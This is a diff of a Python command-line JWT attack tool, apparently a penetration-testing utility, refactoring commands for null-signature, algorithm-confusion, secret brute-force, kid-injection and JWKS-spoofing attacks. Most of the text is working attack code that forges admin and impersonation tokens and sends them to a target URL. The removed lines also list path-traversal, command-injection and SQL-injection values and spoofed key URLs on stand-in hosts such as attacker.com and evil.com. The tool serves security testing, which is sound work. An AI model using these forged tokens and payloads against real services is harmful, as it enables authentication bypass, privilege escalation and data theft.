-                            click.echo(f"   💀 Payload used: {json.dumps(payload_info)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly validates signatures")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, payload_info in attack_tokens:
-                    await test_endpoint(token_name, token_value, payload_info)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each variant against your API")
-            click.echo("• If ANY variant is accepted, signature verification is bypassed")
-            click.echo("• Proper implementation should reject ALL null signature variants")
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Attack variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.NULL_SIGNATURE, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Implement proper signature validation - never accept empty signatures")
         click.echo("• Validate signature length and format before verification")
         click.echo("• Use established JWT libraries with proper validation")
         click.echo("• Implement signature presence checks before cryptographic verification")
-        
+
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+def _load_public_key_material_cli(material):
+    """Resolve operator-supplied public-key material for the CLI.
+
+    ``material`` may be a filesystem path to a PEM/DER file or inline PEM
+    text. Returns raw bytes when a readable file is found (so binary DER works),
+    otherwise the original string (inline PEM). Mirrors the auth module's
+    path-or-inline resolution so both entry points behave identically.
+    """
+    try:
+        path = Path(material)
+        if path.exists() and path.is_file():
+            return path.read_bytes()
+    except (OSError, ValueError):
+        pass
+    return material
+
+
+@jwt.command('test-alg-confusion')
+@click.argument('token')
+@click.option('--public-key', 'public_key', required=True, metavar='PATH_OR_PEM',
+              help='Target RSA/EC public key (PEM/DER file path or inline PEM) used as the HMAC secret')
+@click.option('--payload', help='Custom payload to inject (JSON format)')
+@click.option('--url', '-u', help='Target URL to test the confusion attack against (optional)')
+@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
+@click.option('--data', '-d', help='POST data for endpoint testing')
+@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
+@click.pass_context
+def jwt_test_alg_confusion(ctx, token, public_key, payload, url, header, data, timeout):
+    """Test algorithm/key confusion attack (RS256/ES256 -> HS256 substitution)
+
+    \b
+    🧪 CRITICAL SEVERITY ATTACK
+    Algorithm confusion (aka Substitution Attack) forges a token that a server
+    validates with the SAME public key it uses for RS*/ES* verification, but
+    treated as an HS256 HMAC secret:
+
+    1️⃣ Switch the header alg from RS256/ES256 to HS256\b
+    2️⃣ HMAC-sign header.payload using the server's PUBLIC KEY bytes as the secret\b
+    3️⃣ Every public-key representation is tried (PEM ±newline, DER, x5c cert)\b
+    4️⃣ A server that accepts the forged token confuses the key's role
+
+    \b
+    Examples:
+      # Generate confusion tokens for manual testing
+      python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
+
+      # Inject an admin payload and test against a live endpoint
+      python apileaks.py jwt test-alg-confusion TOKEN --public-key key.pem \\
+          --payload '{"role":"admin"}' --url https://api.example.com/admin
+    """
+    try:
+        click.echo("🔍 Algorithm/Key Confusion Attack (RS256/ES256 -> HS256)")
+        click.echo("="*55)
+        click.echo("🔥 SEVERITY: CRITICAL - Signature forged with the public key")
+        click.echo("")
+
+        custom_headers = _parse_custom_headers(header)
+        public_key_material = _load_public_key_material_cli(public_key)
+
+        # Decode original token for display.
+        decoded = decode_jwt(token)
+        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
+        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
+        click.echo("")
+
+        # Merge a custom payload onto the base token before running the vector.
+        base_token = token
+        if payload:
+            try:
+                custom_payload = json.loads(payload)
+            except json.JSONDecodeError:
+                click.echo(f"❌ Invalid JSON payload: {payload}")
+                return
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.ALGORITHM_CONFUSION, url,
+                        custom_headers, data, timeout,
+                        public_key_material=public_key_material)
+
+        click.echo(f"\n💡 REMEDIATION:")
+        click.echo("• Bind each key to a single algorithm; never share keys across alg families")
+        click.echo("• Enforce an algorithm allowlist (e.g. only RS256) during verification")
+        click.echo("• Never let the token header dictate the verification algorithm")
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3430,7 +4898,7 @@ def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, time
         
         # Decode token to get header and payload
         decoded = decode_jwt(token)
-        
+
         # 1️⃣ Confirm JWT uses HS* algorithm
         algorithm = decoded['header'].get('alg', '').upper()
         if not algorithm.startswith('HS'):
@@ -3438,153 +4906,102 @@ def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, time
             click.echo("   This attack only works against HS256, HS384, HS512")
             if not click.confirm("Continue anyway?"):
                 return
-        
+
         click.echo(f"✅ Target algorithm: {algorithm}")
         click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
         click.echo("")
-        
-        # 2️⃣ & 3️⃣ Execute brute-force and recover secret
+
+        # 2️⃣ & 3️⃣ Recover the secret by SIGNATURE VERIFICATION (Req 16.1-16.3).
+        # A candidate is recovered if and only if verify_hmac_secret is True:
+        # the HMAC over the ORIGINAL raw header.payload segments equals the
+        # original signature. We never re-encode the full token and string-
+        # compare it to the original (Req 16.2), which previously missed valid
+        # secrets due to re-serialization differences. ``None`` sentinel is used
+        # so a legitimately recovered empty-string secret is not treated as
+        # "not found".
         found_secret = None
-        for i, secret in enumerate(secrets[:max_attempts]):
+        candidates = secrets[:max_attempts]
+        for i, secret in enumerate(candidates):
             if i % 50 == 0 and i > 0:
-                click.echo(f"🔄 Progress: {i}/{min(len(secrets), max_attempts)} ({(i/min(len(secrets), max_attempts)*100):.1f}%)")
-            
+                click.echo(f"🔄 Progress: {i}/{len(candidates)} ({(i/len(candidates)*100):.1f}%)")
             try:
-                # Try to verify token with this secret
-                test_token = encode_jwt(decoded['header'], decoded['payload'], secret)
-                if test_token == token:
+                if verify_hmac_secret(token, secret):
                     found_secret = secret
                     break
-            except:
+            except Exception:
                 continue
-        
-        if not found_secret:
+
+        if found_secret is None:
             click.echo(f"\n❌ Secret not found in wordlist")
             click.echo(f"💡 Try a larger wordlist or the secret may be strong")
             return
-        
-        # 🎉 SECRET RECOVERED!
+
+        # 🎉 SECRET RECOVERED! Report the recovered secret AND the matching
+        # algorithm (Req 16.4). The matching algorithm is the header ``alg`` that
+        # verify_hmac_secret validated the signature against.
         click.echo(f"\n" + "="*60)
         click.echo("🎉 SUCCESS! HMAC SECRET RECOVERED!")
         click.echo("="*60)
-        click.echo(f"🔑 Secret: '{found_secret}'")
+        click.echo(f"🔑 Recovered Secret: '{found_secret}'")
+        click.echo(f"🧮 Matching Algorithm: {algorithm}")
         click.echo(f"⚠️  This JWT uses a weak secret that can be brute-forced!")
         click.echo("")
-        
-        # 4️⃣ Forge new JWT with modified claims
-        click.echo("4️⃣ Forging malicious JWT tokens...")
-        
-        # Create privilege escalation payloads
-        attack_payloads = []
-        
-        # Original payload as baseline
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        # Privilege escalation attacks
-        escalation_payload = copy.deepcopy(original_payload)
-        escalation_payload.update({
-            'role': 'admin',
-            'scope': 'admin read write delete',
-            'admin': True,
-            'is_admin': True,
-            'privileges': ['admin', 'superuser', 'root']
-        })
-        attack_payloads.append(("Privilege Escalation", escalation_payload))
-        
-        # User impersonation
-        if 'sub' in original_payload:
-            impersonation_payload = copy.deepcopy(original_payload)
-            impersonation_payload['sub'] = 'admin'
-            impersonation_payload['username'] = 'admin'
-            impersonation_payload['user_id'] = '1'
-            attack_payloads.append(("User Impersonation", impersonation_payload))
-        
-        # Expiration bypass
-        if 'exp' in original_payload:
-            import time
-            extended_payload = copy.deepcopy(original_payload)
-            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-            attack_payloads.append(("Expiration Extension", extended_payload))
-        
-        # Generate attack tokens
-        attack_tokens = []
-        for attack_name, attack_payload in attack_payloads:
-            try:
-                attack_token = encode_jwt(decoded['header'], attack_payload, found_secret)
-                attack_tokens.append((attack_name, attack_token, attack_payload))
-                click.echo(f"✅ Generated {attack_name} token")
-            except Exception as e:
-                click.echo(f"❌ Failed to generate {attack_name} token: {e}")
-        
-        # 5️⃣ Test real API access if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing exploitation against real endpoint...")
+
+        # 4️⃣ & 5️⃣ Forge and exploit through the single-source-of-truth engine.
+        # Using the recovered secret as the signing key, the engine forges the
+        # privilege-escalation / impersonation / expiration-bypass tokens and,
+        # when a URL is supplied, issues them through the shared HTTPRequestEngine
+        # (Req 17.1). Success is decided by the engine's response analyzer, never
+        # by admin/dashboard keyword presence (Req 19.2).
+        forge_vectors = (
+            AttackType.WEAK_SECRET,
+            AttackType.PRIVILEGE_ESCALATION,
+            AttackType.USER_IMPERSONATION,
+            AttackType.EXPIRATION_BYPASS,
+        )
+
+        if url:
+            click.echo("4️⃣ Forging and testing exploitation tokens via JWTAttackEngine...")
             click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, payload_info):
+
+            async def _run():
+                http_engine = _build_jwt_http_engine(timeout)
                 try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name} Test:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'authorized']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 POTENTIAL VULNERABILITY: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_info, indent=2)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked or unsuccessful")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, payload_info in attack_tokens:
-                    await test_endpoint(token_name, token_value, payload_info)
-            
-            asyncio.run(run_all_tests())
-        
+                    engine = _make_jwt_engine(
+                        token, url, custom_headers, data,
+                        http_engine=http_engine, signing_secret=found_secret)
+                    for attack_type in forge_vectors:
+                        result = await engine.execute_attack(attack_type)
+                        _report_attack_result(result)
+                finally:
+                    await http_engine.close()
+
+            asyncio.run(_run())
+        else:
+            click.echo("4️⃣ Forging exploitation tokens via JWTAttackEngine...")
+            engine = _make_jwt_engine(
+                token, url, custom_headers, data, signing_secret=found_secret)
+            for attack_type in forge_vectors:
+                _display_generated_tokens(engine, attack_type)
+            click.echo("\n⚠️  Provide --url to test the forged tokens against an endpoint")
+
         # Summary and recommendations
         click.echo(f"\n" + "="*60)
         click.echo("🔥 ATTACK SUMMARY")
         click.echo("="*60)
-        click.echo(f"✅ Secret recovered: '{found_secret}'")
-        click.echo(f"✅ Attack tokens generated: {len(attack_tokens)}")
+        click.echo(f"✅ Secret recovered: '{found_secret}' (alg: {algorithm})")
         if url:
             click.echo(f"✅ Endpoint testing completed")
-        
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Use a strong, randomly generated HMAC secret (32+ characters)")
         click.echo("• Consider switching to RS256 (asymmetric) algorithm")
         click.echo("• Implement proper secret rotation policies")
         click.echo("• Never use default or common secrets")
-        
+
         if found_secret in ["secret", "password", "123456", ""]:
             click.echo(f"\n🚨 CRITICAL: Using extremely weak secret '{found_secret}'!")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3654,215 +5071,23 @@ def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, 
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
         
-        # 1️⃣ Create malicious kid injection payloads
-        click.echo("1️⃣ Creating kid injection payloads...")
-        
-        # Determine JWT payload to use
-        jwt_payloads = []
-        
-        # Use custom payload if provided
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated kid
+        # injection payload set; a custom --payload is merged onto the base token.
+        base_token = token
         if payload:
             try:
                 custom_payload = json.loads(payload)
-                jwt_payloads.append(("Custom JWT Payload", custom_payload))
             except json.JSONDecodeError:
                 click.echo(f"❌ Invalid JSON payload: {payload}")
                 return
-        else:
-            # Create privilege escalation payloads automatically
-            original_payload = copy.deepcopy(decoded['payload'])
-            
-            # Admin privilege escalation
-            admin_payload = copy.deepcopy(original_payload)
-            admin_payload.update({
-                'sub': 'admin',
-                'role': 'admin', 
-                'admin': True,
-                'is_admin': True,
-                'scope': 'admin read write delete',
-                'privileges': ['admin', 'superuser']
-            })
-            jwt_payloads.append(("Admin Privilege Escalation", admin_payload))
-            
-            # User impersonation
-            if 'sub' in original_payload and original_payload['sub'] != 'admin':
-                impersonation_payload = copy.deepcopy(original_payload)
-                impersonation_payload['sub'] = 'admin'
-                impersonation_payload['username'] = 'admin'
-                impersonation_payload['user_id'] = '1'
-                jwt_payloads.append(("User Impersonation", impersonation_payload))
-            
-            # Extended expiration
-            if 'exp' in original_payload:
-                import time
-                extended_payload = copy.deepcopy(original_payload)
-                extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-                jwt_payloads.append(("Extended Expiration", extended_payload))
-            
-            # If no special payloads were created, use original
-            if not jwt_payloads:
-                jwt_payloads.append(("Original Payload", original_payload))
-        
-        # 2️⃣ & 3️⃣ Path traversal and URL injection payloads
-        injection_payloads = [
-            # Custom payload first
-            ("Custom Kid", kid_payload),
-            
-            # Path traversal attacks
-            ("Linux passwd", "../../etc/passwd"),
-            ("Linux shadow", "../../../etc/shadow"), 
-            ("Windows hosts", "../../windows/system32/drivers/etc/hosts"),
-            ("Absolute path", "/etc/passwd"),
-            ("Null byte", "../../etc/passwd\x00"),
-            ("URL encoded", "..%2F..%2Fetc%2Fpasswd"),
-            
-            # Remote URL attacks
-            ("HTTP URL", "http://attacker.com/key.pem"),
-            ("HTTPS URL", "https://evil.com/malicious.key"),
-            ("FTP URL", "ftp://attacker.com/key.pem"),
-            ("File URL", "file:///etc/passwd"),
-            
-            # Command injection attempts
-            ("Command injection 1", "key'; whoami; #"),
-            ("Command injection 2", "$(whoami)"),
-            ("Command injection 3", "`whoami`"),
-            ("Command injection 4", "||whoami||"),
-            ("Command injection 5", "/dev/null; whoami #"),
-            
-            # SQL injection attempts
-            ("SQL injection 1", "'; DROP TABLE users; --"),
-            ("SQL injection 2", "' OR '1'='1"),
-            ("SQL injection 3", "' UNION SELECT * FROM users --"),
-        ]
-        
-        # Generate attack tokens (combine kid payloads with JWT payloads)
-        attack_tokens = []
-        import base64
-        
-        for jwt_payload_name, jwt_payload_data in jwt_payloads:
-            for kid_attack_name, kid_payload_data in injection_payloads:
-                # Modify header with kid injection
-                new_header = copy.deepcopy(decoded['header'])
-                new_header['kid'] = kid_payload_data
-                
-                # Create new token
-                header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-                payload_b64 = base64.urlsafe_b64encode(json.dumps(jwt_payload_data).encode()).decode().rstrip('=')
-                
-                # For path traversal, keep original signature (might work if key is found)
-                # For command/SQL injection, remove signature (likely to fail validation anyway)
-                if any(x in kid_payload_data for x in ['../', '/etc/', 'windows', 'http://', 'https://', 'ftp://', 'file://']):
-                    # Path traversal and URL - keep signature
-                    injected_token = f"{header_b64}.{payload_b64}.{decoded['signature']}"
-                else:
-                    # Command/SQL injection - remove signature
-                    injected_token = f"{header_b64}.{payload_b64}."
-                
-                combined_name = f"{jwt_payload_name} + {kid_attack_name}"
-                attack_tokens.append((combined_name, injected_token, kid_payload_data, jwt_payload_data))
-            
-        click.echo(f"✅ Generated {len(attack_tokens)} kid injection variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated Kid Injection Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, kid_payload_info, jwt_payload_info) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   Kid: {kid_payload_info}")
-            click.echo(f"   JWT Payload: {json.dumps(jwt_payload_info)}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 4️⃣ & 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n4️⃣ Testing kid injection against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, kid_payload, jwt_payload):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        vulnerability_type = "Unknown"
-                        
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        
-                        # Check for file disclosure
-                        if any(indicator in response_text for indicator in ['root:', 'bin/bash', 'daemon:', 'nobody:']):
-                            success_indicators.append("File Disclosure Detected (/etc/passwd)")
-                            vulnerability_type = "File Disclosure"
-                        
-                        # Check for privileged access
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged']):
-                            success_indicators.append("Privileged Content Detected")
-                            vulnerability_type = "Authentication Bypass"
-                        
-                        # Check for command execution
-                        if any(indicator in response_text for indicator in ['uid=', 'gid=', 'groups=']):
-                            success_indicators.append("Command Execution Detected")
-                            vulnerability_type = "Remote Code Execution"
-                        
-                        # Check for error messages that might indicate processing
-                        if any(indicator in response_text for indicator in ['file not found', 'permission denied', 'no such file']):
-                            success_indicators.append("File System Access Attempted")
-                            vulnerability_type = "Path Traversal"
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            severity = "🚨 CRITICAL" if vulnerability_type in ["File Disclosure", "Remote Code Execution"] else "🟠 HIGH"
-                            click.echo(f"   {severity} VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Type: {vulnerability_type}")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Kid payload: {kid_payload}")
-                            click.echo(f"   💀 JWT payload: {json.dumps(jwt_payload)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked or unsuccessful")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, kid_payload, jwt_payload in attack_tokens:
-                    await test_endpoint(token_name, token_value, kid_payload, jwt_payload)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each token against your API")
-            click.echo("• Monitor server logs for file access or command execution")
-            click.echo("• Path traversal may expose sensitive files")
-            click.echo("• Command injection may execute system commands")
-            click.echo("• URL injection may cause server to fetch from attacker-controlled URLs")
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Kid injection variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.KID_INJECTION, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Validate and sanitize kid parameter before use")
         click.echo("• Use allowlist of permitted key identifiers")
@@ -3870,7 +5095,7 @@ def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, 
         click.echo("• Implement proper input validation and path traversal protection")
         click.echo("• Avoid dynamic key loading based on user input")
         click.echo("• Use static key stores with predefined key identifiers")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3929,148 +5154,12 @@ def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
         click.echo(f"� Original Paayload: {json.dumps(decoded['payload'])}")
         click.echo("")
         
-        # 2️⃣ Create spoofed JWKS URLs
-        click.echo("2️⃣ Creating JWKS spoofing payloads...")
-        
-        # 3️⃣ Various JWKS URL spoofing techniques
-        jku_variations = [
-            ("Custom JWKS URL", jwks_url),
-            ("Attacker Domain", "http://attacker.com/jwks.json"),
-            ("HTTPS Attacker", "https://evil.com/.well-known/jwks.json"),
-            ("Localhost Bypass", "http://localhost:8080/jwks.json"),
-            ("Internal Network", "http://192.168.1.100/jwks.json"),
-            ("File Protocol", "file:///etc/passwd"),
-            ("FTP Protocol", "ftp://attacker.com/jwks.json"),
-            ("Data URL", "data:application/json,{\"keys\":[{\"kty\":\"RSA\"}]}"),
-            ("URL with Path Traversal", "http://legitimate.com/../../../attacker.com/jwks.json"),
-            ("Subdomain Takeover", "http://abandoned.legitimate.com/jwks.json"),
-        ]
-        
-        # Generate attack tokens
-        attack_tokens = []
-        import base64
-        
-        for attack_name, jku_url in jku_variations:
-            # Modify header with jku spoofing
-            new_header = copy.deepcopy(decoded['header'])
-            new_header['jku'] = jku_url
-            
-            # Also try x5u parameter (X.509 URL)
-            x5u_header = copy.deepcopy(decoded['header'])
-            x5u_header['x5u'] = jku_url.replace('jwks.json', 'cert.pem')
-            
-            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-            payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded['payload']).encode()).decode().rstrip('=')
-            
-            x5u_header_b64 = base64.urlsafe_b64encode(json.dumps(x5u_header).encode()).decode().rstrip('=')
-            
-            # 4️⃣ Remove signature since we're spoofing the key source
-            spoofed_token_jku = f"{header_b64}.{payload_b64}."
-            spoofed_token_x5u = f"{x5u_header_b64}.{payload_b64}."
-            
-            attack_tokens.append((f"{attack_name} (JKU)", spoofed_token_jku, jku_url))
-            attack_tokens.append((f"{attack_name} (X5U)", spoofed_token_x5u, jku_url.replace('jwks.json', 'cert.pem')))
-        
-        click.echo(f"✅ Generated {len(attack_tokens)} JWKS spoofing variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated JWKS Spoofing Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, url_used) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   URL: {url_used}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing JWKS spoofing against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, jwks_url_used):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        
-                        # Check for privileged access
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        # Check for specific JWKS-related errors
-                        if any(indicator in response_text for indicator in ['jwks', 'key', 'certificate']):
-                            success_indicators.append("JWKS Processing Detected")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server may have fetched from: {jwks_url_used}")
-                            click.echo(f"   💀 JWKS spoofing successful!")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly validates JWKS sources")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, jwks_url_used in attack_tokens:
-                    await test_endpoint(token_name, token_value, jwks_url_used)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Host a malicious JWKS at the specified URLs")
-            click.echo("• Test each token against your API")
-            click.echo("• Monitor server for outbound requests to your URLs")
-            click.echo("• If server fetches from your URL, JWKS spoofing is possible")
-        
-        # Display sample malicious JWKS
-        click.echo(f"\n💡 Sample Malicious JWKS to host:")
-        click.echo("-" * 40)
-        sample_jwks = {
-            "keys": [{
-                "kty": "RSA",
-                "kid": "attacker-key-2024",
-                "use": "sig",
-                "alg": "RS256",
-                "n": "sample_modulus_replace_with_real_key",
-                "e": "AQAB"
-            }]
-        }
-        click.echo(json.dumps(sample_jwks, indent=2))
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ JWKS spoofing variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
+        # jku/x5u spoofing URL set and signs with the resolved key.
+        _run_jwt_vector(token, AttackType.JWKS_SPOOF, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Implement JWKS URL allowlist - only trust known, legitimate URLs")
         click.echo("• Validate JWKS URLs against strict patterns")
@@ -4078,7 +5167,7 @@ def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
         click.echo("• Implement network-level restrictions for JWKS fetching")
         click.echo("• Never trust user-controlled jku or x5u parameters")
         click.echo("• Consider using static key stores instead of dynamic JWKS")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -4136,189 +5225,12 @@ def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
         
-        # 1️⃣ Generate attacker's key pair (simulated)
-        click.echo("1️⃣ Generating attacker's key pair...")
-        
-        # 2️⃣ Create malicious inline JWKS variations
-        click.echo("2️⃣ Creating inline JWKS injection payloads...")
-        
-        # Different inline JWK variations
-        jwk_variations = [
-            ("RSA Key", {
-                "kty": "RSA",
-                "kid": "attacker-rsa-key-2024",
-                "use": "sig",
-                "alg": "RS256",
-                "n": "malicious_rsa_modulus_replace_with_real_key",
-                "e": "AQAB"
-            }),
-            ("EC Key", {
-                "kty": "EC",
-                "kid": "attacker-ec-key-2024", 
-                "use": "sig",
-                "alg": "ES256",
-                "crv": "P-256",
-                "x": "malicious_ec_x_coordinate",
-                "y": "malicious_ec_y_coordinate"
-            }),
-            ("Symmetric Key", {
-                "kty": "oct",
-                "kid": "attacker-hmac-key-2024",
-                "use": "sig", 
-                "alg": "HS256",
-                "k": "YXR0YWNrZXJfc2VjcmV0X2tleQ"  # base64: attacker_secret_key
-            }),
-            ("Minimal RSA", {
-                "kty": "RSA",
-                "n": "minimal_modulus",
-                "e": "AQAB"
-            }),
-            ("Key with X5C", {
-                "kty": "RSA",
-                "kid": "attacker-x5c-key",
-                "use": "sig",
-                "n": "x5c_modulus",
-                "e": "AQAB",
-                "x5c": ["MIICertificateChainHere"]
-            })
-        ]
-        
-        # Create privilege escalation payloads
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        attack_payloads = [
-            ("Admin Privilege Escalation", {
-                **original_payload,
-                'sub': 'admin',
-                'role': 'admin', 
-                'admin': True,
-                'is_admin': True,
-                'scope': 'admin read write delete',
-                'privileges': ['admin', 'superuser']
-            }),
-            ("User Impersonation", {
-                **original_payload,
-                'sub': 'admin',
-                'username': 'admin',
-                'user_id': '1'
-            }),
-            ("Extended Expiration", {
-                **original_payload,
-                'exp': int(__import__('time').time()) + (365 * 24 * 60 * 60)  # 1 year
-            })
-        ]
-        
-        # Generate attack tokens
-        attack_tokens = []
-        import base64
-        
